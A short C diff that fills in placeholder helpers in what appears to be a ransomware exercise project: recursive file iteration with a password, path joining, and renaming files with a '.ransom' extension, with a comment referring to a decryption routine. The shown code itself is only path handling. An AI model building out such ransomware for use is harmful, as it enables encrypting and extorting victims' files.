@@ -43,16 +43,22 @@ int iter_recursively_through_files(char *path, char *password,
     return EXIT_SUCCESS;
 }
 
+#define MAX_FILEPATH 4096
+
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
-    // step 1
+    size_t len = strlen(parentpath);
+
+    if (parentpath[len - 1] == '/')
+        snprintf(finalpath, MAX_FILEPATH, "%s%s", parentpath, currentpath);
+    else
+        snprintf(finalpath, MAX_FILEPATH, "%s/%s", parentpath, currentpath);
 }
 
 void add_file_extension(const char *filename, char *opt_filename)
 {
-    // step 1
+    snprintf(opt_filename, MAX_FILEPATH, "%s.ransom", filename);
 }
-
 
 /*
 ** As you can compare with the skip_already_decrypted for the decryption algorithm,
